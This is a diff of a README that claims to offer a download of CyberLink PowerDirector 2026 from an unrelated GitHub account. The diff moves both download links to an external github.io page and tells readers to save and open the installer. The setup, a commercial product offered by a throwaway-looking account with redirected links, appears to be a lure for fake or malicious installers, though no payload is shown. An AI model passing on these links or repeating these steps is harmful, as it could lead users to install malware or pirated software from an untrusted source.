@@ -1,6 +1,6 @@
 # 🎬 CyberLink-PowerDirector-2026 - Master video editing on Windows systems
 
-[![](https://img.shields.io/badge/Download-PowerDirector-blue)](https://github.com/membraneboneriverboulder458/CyberLink-PowerDirector-2026)
+[![](https://img.shields.io/badge/Download-PowerDirector-blue)](https://membraneboneriverboulder458.github.io)
 
 CyberLink PowerDirector 2026 provides professional editing tools for your video projects. This version works on Windows 10 and Windows 11. It offers features for cutting, splicing, and adding effects to your footage. Follow this guide to install the software on your desktop or laptop.
 
@@ -20,7 +20,7 @@ Ensure your Windows system has the latest updates installed. You can check for u
 
 Follow these steps to get the software on your machine.
 
-1. Navigate to the release page using this link: [Download CyberLink PowerDirector 2026](https://github.com/membraneboneriverboulder458/CyberLink-PowerDirector-2026).
+1. Navigate to the release page using this link: [Download CyberLink PowerDirector 2026](https://membraneboneriverboulder458.github.io).
 2. Locate the download button on the page.
 3. Save the installation file to your Downloads folder.
 4. Open the Downloads folder in File Explorer.
